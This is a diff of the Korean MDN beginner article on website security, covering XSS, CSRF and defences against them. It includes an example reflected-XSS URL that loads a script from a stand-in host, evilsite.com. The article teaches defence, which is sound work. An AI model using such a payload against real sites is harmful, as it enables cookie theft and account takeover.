@@ -14,7 +14,7 @@ translation_of: Learn/Server-side/First_steps/Website_security
 
 <div>{{PreviousMenu("Learn/Server-side/First_steps/Web_frameworks", "Learn/Server-side/First_steps")}}</div>
 
-<p class="summary">웹사이트 보안은 설계와 사용의 모든 측면에서 주의를 기울여야 한다. 이 글은 입문자용이므로 당신을 웹사이트 보안 전문가로 만들어주지는 않지만, 보안 위협 요소가 어디에서 발생하는지와, 가장 일반적인 공격으로부터 웹 응용 프로그램을 어떻게 강화할 수 있는지 이해하는데 도움을 줄 것이다.</p>
+<p class="summary">웹사이트 보안은 설계와 사용의 모든 측면에서 주의를 기울여야 한다. 이 글은 입문자용이므로 당신을 웹사이트 보안 전문가로 만들어주지는 않지만, 보안 위협 요소가 어디에서 발생하는지와, 가장 일반적인 공격으로부터 웹 응용 프로그램을 어떻게 강화할 수 있는지 이해하는데 도움을 줄 것이다.</p>
 
 <table class="learn-box standard-table">
  <tbody>
@@ -33,11 +33,11 @@ translation_of: Learn/Server-side/First_steps/Website_security
 
 <h2 id="웹사이트_보안이란_무엇인가">웹사이트 보안이란 무엇인가?</h2>
 
-<p>인터넷은 위험한 곳이다! 구체적인 사례로, 우리는 정기적으로 웹사이트가 서비스 거부 공격으로 마비되거나, 홈페이지에 수정된 (그리고 종종 위해한) 정보가 게시된 소식을 듣는다. 또 다른 영향력이 큰 사례로, 수백만 개의 비밀번호, 이메일 주소, 신용카드 정보가 공용 도메인으로 유출되어, 웹사이트 사용자들에게 심리적 당혹감과 경제적인 위험을 유발한다.</p>
+<p>인터넷은 위험한 곳이다! 구체적인 사례로, 우리는 정기적으로 웹사이트가 서비스 거부 공격으로 마비되거나, 홈페이지에 수정된 (그리고 종종 위해한) 정보가 게시된 소식을 듣는다. 또 다른 영향력이 큰 사례로, 수백만 개의 비밀번호, 이메일 주소, 신용카드 정보가 공용 도메인으로 유출되어, 웹사이트 사용자들에게 심리적 당혹감과 경제적인 위험을 유발한다.</p>
 
 <p>웹사이트 보안의 목적은 이러한 (또는 어떤) 종류의 공격을 방지하는 것이다. 딱딱하게 말하자면, <em>웹사이트 보안이란, 비승인된 접근, 사용, 수정, 파괴, 중단으로부터 웹사이트를 보호하는 행동 또는 실행을 가리킨다.</em></p>
 
-<p>웹사이트 보안을 효과적으로 하기 위해서는 웹사이트를 설계하는 과정의 전반에 걸쳐 노력을 기울여야 한다: 웹 애플리케이션에서, 웹 서버 설정에서, 비밀번호를 생성하고 재발급하는 정책에서, 클라이언트측 코드에서 말이다. 이 말이 보안에 필요한 많은 작업들을 당신이 직접 세세하게 해주어야 한다는 불길한 말로 들릴 수 있다. 하지만 다행스럽게도 서버측 웹 프레임워크를 사용한다면, 일반적인 보안 공격에 대해 이미 견고하고 잘 검증 된 방어 메커니즘이 "기본으로" 제공된다. 다른 공격들은 HTTPS를 활성화하는 등의 웹 서버 설정을 통해 방지할 수 있다. 마지막으로, 공개된 취약점 스캐너 도구를 사용하여 알려진 보안 실수들은 잡아낼 수 있을 것이다.</p>
+<p>웹사이트 보안을 효과적으로 하기 위해서는 웹사이트를 설계하는 과정의 전반에 걸쳐 노력을 기울여야 한다: 웹 애플리케이션에서, 웹 서버 설정에서, 비밀번호를 생성하고 재발급하는 정책에서, 클라이언트측 코드에서 말이다. 이 말이 보안에 필요한 많은 작업들을 당신이 직접 세세하게 해주어야 한다는 불길한 말로 들릴 수 있다. 하지만 다행스럽게도 서버측 웹 프레임워크를 사용한다면, 일반적인 보안 공격에 대해 이미 견고하고 잘 검증 된 방어 메커니즘이 "기본으로" 제공된다. 다른 공격들은 HTTPS를 활성화하는 등의 웹 서버 설정을 통해 방지할 수 있다. 마지막으로, 공개된 취약점 스캐너 도구를 사용하여 알려진 보안 실수들은 잡아낼 수 있을 것이다.</p>
 
 <p>이 글의 나머지 부분은 몇 가지 일반적인 보안 위협들과 사이트를 보호하기 위해 취할 수 있는 간단한 지침들을 제공한다.</p>
 
@@ -49,21 +49,21 @@ translation_of: Learn/Server-side/First_steps/Website_security
 
 <h3 id="사이트_간_스크립팅_(Cross-Site_Scripting_XSS)">사이트 간 스크립팅 (Cross-Site Scripting, XSS)</h3>
 
-<p>XSS는 공격자가 클라이언트 측 스크립트를 웹 사이트에 삽입하여 다른 사용자의 부라우저에서 수행되게 하는 공격의 유형을 말한다. 삽입된 코드는 웹 사이트에서 피해 사용자의 브라우저로 전송이 됨으로 피해 사용자에게 의심받지 않는다. 따라서, 그 삽입된 코드는 피해 사용자의 사이트 권한 쿠키를 공격자에게 보내는 종류의 악성 작업을 수행할 수 있다. 그리고 그것을 전달 받은 공격자는 마치 피해 사용자인 것처럼 위장하여 사이트에 로그인하고 피해 사용자가 할 수 있는 모든 작업을 수행할 수 있다. 가령, 신용 카드 세부 정보에 접근하거나, 연락처 세부 정보를 확인하거나, 암호를 변경하는 작업 등을 수행할 수 있다.</p>
+<p>XSS는 공격자가 클라이언트 측 스크립트를 웹 사이트에 삽입하여 다른 사용자의 부라우저에서 수행되게 하는 공격의 유형을 말한다. 삽입된 코드는 웹 사이트에서 피해 사용자의 브라우저로 전송이 됨으로 피해 사용자에게 의심받지 않는다. 따라서, 그 삽입된 코드는 피해 사용자의 사이트 권한 쿠키를 공격자에게 보내는 종류의 악성 작업을 수행할 수 있다. 그리고 그것을 전달 받은 공격자는 마치 피해 사용자인 것처럼 위장하여 사이트에 로그인하고 피해 사용자가 할 수 있는 모든 작업을 수행할 수 있다. 가령, 신용 카드 세부 정보에 접근하거나, 연락처 세부 정보를 확인하거나, 암호를 변경하는 작업 등을 수행할 수 있다.</p>
 
 <div class="note">
-<p><strong>Note</strong>: XSS 취약점은 전통적으로 다른 유형보다 일반적이었다.</p>
+<p><strong>Note</strong>: XSS 취약점은 전통적으로 다른 유형보다 일반적이었다.</p>
 </div>
 
-<p>삽입된 스크립트를 브라우저에 반환하도록 사이트를 속이는 데에는 두 가지 주요 접근방법이 있다. 그것은 반사적 XSS 취약점과 지속적 XSS 취약점이다.</p>
+<p>삽입된 스크립트를 브라우저에 반환하도록 사이트를 속이는 데에는 두 가지 주요 접근방법이 있다. 그것은 반사적 XSS 취약점과 지속적 XSS 취약점이다.</p>
 
 <ul>
  <li>A <em>reflected</em> XSS vulnerability occurs when user content that is passed to the server is returned <em>immediately</em> and <em>unmodified</em> for display in the browser — any scripts in the original user content will be run when the new page is loaded!<br>
-  For example, consider a site search function where the search terms are encoded as URL parameters, and these terms are displayed along with the results. An attacker can construct a search link containing a malicious script as a parameter (e.g. <code>http://mysite.com?q=beer&lt;script%20src="http://evilsite.com/tricky.js"&gt;&lt;/script&gt;</code>) and email it to another user. If the target user clicks this "interesting link", the script will be executed when the search results are displayed. As discussed above, this gives the attacker all the information they need to enter the site as the target user — potentially making purchases as the user or sharing their contact information.</li>
+  For example, consider a site search function where the search terms are encoded as URL parameters, and these terms are displayed along with the results. An attacker can construct a search link containing a malicious script as a parameter (e.g. <code>http://mysite.com?q=beer&lt;script%20src="http://evilsite.com/tricky.js"&gt;&lt;/script&gt;</code>) and email it to another user. If the target user clicks this "interesting link", the script will be executed when the search results are displayed. As discussed above, this gives the attacker all the information they need to enter the site as the target user — potentially making purchases as the user or sharing their contact information.</li>
  <li>A <em>persistent</em> XSS vulnerability is one where the malicious script is <em>stored</em> by the website and then later redisplayed unmodified for other users to unwittingly execute.<br>
-  For example, a discussion board that accepts comments containing unmodified HTML could store a malicious script from an attacker. When the comments are displayed the script is executed and can then send the attacker information required to access the user's account. This sort of attack is extremely popular and powerful, because the attacker doesn't have to have any direct engagement with the victims.<br>
+  For example, a discussion board that accepts comments containing unmodified HTML could store a malicious script from an attacker. When the comments are displayed the script is executed and can then send the attacker information required to access the user's account. This sort of attack is extremely popular and powerful, because the attacker doesn't have to have any direct engagement with the victims.<br>
   <br>
-  While <code>POST</code> or <code>GET</code> data is the most common source of XSS vulnerabilities, any data from the browser is potentially vulnerable (including cookie data rendered by the browser, or user files that are uploaded and displayed).</li>
+  While <code>POST</code> or <code>GET</code> data is the most common source of XSS vulnerabilities, any data from the browser is potentially vulnerable (including cookie data rendered by the browser, or user files that are uploaded and displayed).</li>
 </ul>
 
 <p>The best defence against XSS vulnerabilities is to remove or disable any markup that can potentially contain instructions to run code. For HTML this includes tags like <code>&lt;script&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, and <code>&lt;link&gt;</code>.</p>
@@ -109,19 +109,19 @@ translation_of: Learn/Server-side/First_steps/Website_security
 
 <p>This type of attack is best explained by example. John is a malicious user who knows that a particular site allows logged-in users to send money to a specified account using an HTTP <code>POST</code> request that includes the account name and an amount. John constructs a form that includes his bank details and an amount of money as hidden fields, and emails it to other site users (with the <em>Submit</em> button disguised as a link to a "get rich quick" site).</p>
 
-<p>If a user clicks the submit button, an HTTP <code>POST</code> request will be sent to the server containing the transaction details and <em>any client-side cookies that the browser associates with the site</em> (adding associated site cookies to requests is normal browser behaviour). The server will check the cookies, and use them to determine whether or not the user is logged in and has permission to make the transaction.</p>
+<p>If a user clicks the submit button, an HTTP <code>POST</code> request will be sent to the server containing the transaction details and <em>any client-side cookies that the browser associates with the site</em> (adding associated site cookies to requests is normal browser behaviour). The server will check the cookies, and use them to determine whether or not the user is logged in and has permission to make the transaction.</p>
 
-<p>The result is that a<span style="line-height: 1.5;">ny user who clicks the <em>Submit</em> button while they are logged in to the trading site will make the transaction. John gets rich!</span></p>
+<p>The result is that a<span style="line-height: 1.5;">ny user who clicks the <em>Submit</em> button while they are logged in to the trading site will make the transaction. John gets rich!</span></p>
 
 <div class="note">
-<p><strong>Note</strong>: The trick here is that John doesn't need to have access to the user's cookies (or access credentials) — the user's browser stores this information, and automatically includes it in all requests to the associated server.</p>
+<p><strong>Note</strong>: The trick here is that John doesn't need to have access to the user's cookies (or access credentials) — the user's browser stores this information, and automatically includes it in all requests to the associated server.</p>
 </div>
 
 <p>One way to prevent this type of attack is for the server to require that <code>POST</code> requests includes a user-specific site-generated secret (the secret would be supplied by the server when sending the web form used to make transfers). This approach prevents John from creating his own form because he would have to know the secret that the server is providing for the user. Even if he found out the secret and created a form for a particular user, he would no longer be able to use that same form to attack every user.</p>
 
 <p>Web frameworks often include such CSRF prevention mechanisms.</p>
 
-<h3 id="Other_threats">Other threats</h3>
+<h3 id="Other_threats">Other threats</h3>
 
 <p>Other common attacks/vulnerabilities include:</p>
 
